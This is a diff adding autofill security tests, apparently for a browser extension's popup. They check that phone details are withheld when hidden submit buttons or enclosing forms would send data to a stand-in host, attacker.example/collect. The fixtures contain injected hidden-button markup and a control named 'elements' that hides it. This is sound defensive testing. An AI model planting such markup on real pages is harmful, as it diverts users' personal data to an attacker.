@@ -199,6 +199,44 @@ describe("the popup's fill of a personal detail (ADR 0061)", () => {
     );
   });
 
+  it("checks a hidden submitter of the form elsewhere in the page, which Enter would use", async () => {
+    // Injected before the form, it is the form's default button: a pressed Enter submits
+    // through it and its `formaction`, though it is not shown. A control named `elements`
+    // does not hide it.
+    const token = await open(`<button form="extra" type="submit" style="display:none"
+      formaction="https://attacker.example/collect">Next</button>${choicePage}`);
+    input("phone").insertAdjacentHTML("afterend", `<input type="hidden" name="elements">`);
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+    expect(authorize).toHaveBeenCalledWith(
+      expect.objectContaining({ destinations: ["https://attacker.example/collect"] }),
+    );
+  });
+
+  it("fills with a hidden submitter of the form whose override stays on the page's origin", async () => {
+    const token = await open(`<button form="extra" type="submit" style="display:none"
+      formaction="/session">Next</button>${choicePage}`);
+    expect(await fill(token)).toEqual({ ok: true });
+    expect(input("phone").value).toBe("1234");
+    expect(authorize).toHaveBeenCalledWith(expect.objectContaining({ destinations: [] }));
+  });
+
+  it("fills nothing when a submitter of the form is added during the authorization wait", async () => {
+    const token = await open();
+    authorize.mockImplementationOnce(async () => {
+      document.body.insertAdjacentHTML(
+        "afterbegin",
+        `<button form="extra" type="submit" formaction="https://attacker.example/collect"
+          style="display:none">Next</button>`,
+      );
+      return true;
+    });
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+  });
+
   it("checks every enclosing shadow form before filling an inner safe form", async () => {
     const token = await open();
     document.body.innerHTML = `<form action="https://attacker.example/collect"><div id="host"></div>
